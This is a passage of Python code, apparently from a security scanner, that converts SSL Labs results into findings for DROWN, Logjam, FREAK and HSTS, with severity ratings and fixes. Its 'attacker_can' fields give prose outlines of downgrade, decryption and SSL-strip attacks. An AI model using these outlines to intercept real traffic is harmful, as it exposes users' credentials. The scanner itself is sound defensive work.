                    "server sharing the same private key). DROWN requires no access to the client — "
                    "the attacker captures TLS ciphertext, uses SSLv2 export cipher handshakes as a "
                    "decryption oracle, and recovers the session key in hours. Full HTTPS session "
                    "contents are then readable: credentials, tokens, payment data."
                ),
                "attacker_cannot": None,
                "recommendation": "Disable SSLv2 on all servers sharing this private key. Do not reuse private keys across servers. Patch OpenSSL to remove SSLv2 support.",
                "detail": "Server is vulnerable to DROWN — SSLv2 enabled, enabling cross-protocol decryption of TLS traffic.",
                "burp": BURP_DROWN,
            })

        # ── Logjam ────────────────────────────────────────────────────────
        if details.get("logjam"):
            findings.append({
                "id": "ssl_labs_logjam",
                "name": "Logjam — Weak Diffie-Hellman Key Exchange",
                "category": "TLS Deep Analysis (SSL Labs)",
                "severity": "high",
                "status": "vulnerable",
                "matched_at": hostname,
                "attacker_can": (
                    "Downgrade your TLS handshake to use 512-bit export-grade Diffie-Hellman. "
                    "Using precomputed discrete log tables (feasible on standard hardware for 512-bit DH), "
                    "the attacker recovers the session key in real time and reads the full HTTPS session — "
                    "silently, with no indication to the user or server."
                ),
                "attacker_cannot": None,
                "recommendation": "Disable DHE_EXPORT cipher suites. Generate a unique 2048-bit or 4096-bit DH group. Prefer ECDHE key exchange (X25519 or P-256).",
                "detail": "Server supports export-grade Diffie-Hellman — susceptible to Logjam downgrade.",
                "burp": BURP_LOGJAM,
            })

        # ── FREAK ─────────────────────────────────────────────────────────
        if details.get("freak"):
            findings.append({
                "id": "ssl_labs_freak",
                "name": "FREAK — Export RSA Keys Supported",
                "category": "TLS Deep Analysis (SSL Labs)",
                "severity": "high",
                "status": "vulnerable",
                "matched_at": hostname,
                "attacker_can": (
                    "Force your server into 512-bit RSA_EXPORT key exchange by stripping all "
                    "strong cipher suites from the ClientHello. A 512-bit RSA key can be factored "
                    "in ~7 hours on Amazon EC2 (~$100). Once factored, the attacker decrypts "
                    "all captured HTTPS traffic — exposing every user's session tokens and credentials."
                ),
                "attacker_cannot": None,
                "recommendation": "Disable all RSA_EXPORT cipher suites on your server. Enable only ECDHE and DHE key exchange with 2048-bit+ parameters.",
                "detail": "Server accepts RSA_EXPORT cipher suites — FREAK downgrade attack possible.",
                "burp": BURP_FREAK,
            })

        # ── HSTS (from SSL Labs — works even through Cloudflare) ──────────
        hsts_policy = details.get("hstsPolicy", {})
        hsts_status = hsts_policy.get("status", "absent")
        if hsts_status == "absent":
            findings.append({
                "id": "ssl_labs_hsts",
                "name": "HSTS Not Configured (Confirmed via TLS Layer)",
                "category": "TLS Deep Analysis (SSL Labs)",
                "severity": "high",
                "status": "vulnerable",
                "matched_at": hostname,
                "attacker_can": (
                    "Perform an SSL strip / downgrade attack on first-time visitors. Without HSTS, "
                    "the browser has no memory of HTTPS being required — so an attacker on the same "
                    "network intercepts the initial HTTP request, strips the redirect to HTTPS, and "
                    "reads the session in plain text through Burp Proxy. Credentials entered on "
                    "the first visit are fully exposed."
                ),
                "attacker_cannot": None,
                "recommendation": "Add Strict-Transport-Security: max-age=31536000; includeSubDomains; preload. Submit to the HSTS preload list at hstspreload.org.",
                "detail": "No HSTS policy detected at TLS level — confirmed by SSL Labs deep scan.",
                "burp": BURP_NO_HSTS_SSL,
            })
        else:
            max_age = hsts_policy.get("maxAge", 0)
            findings.append({
                "id": "ssl_labs_hsts",
                "name": "HSTS Policy Active (TLS Verified)",
                "category": "TLS Deep Analysis (SSL Labs)",
                "severity": "info",
                "status": "protected",
                "matched_at": hostname,
                "attacker_can": None,
                "attacker_cannot": "Strip HTTPS and force users onto plain HTTP — the browser remembers HSTS and refuses the downgrade.",
                "recommendation": None,
                "detail": f"HSTS confirmed by SSL Labs. max-age={max_age}s.",
                "burp": None,
            })

    except Exception:
        # SSL Labs unavailable or rate-limited — no findings, not an error
        pass

    return findings
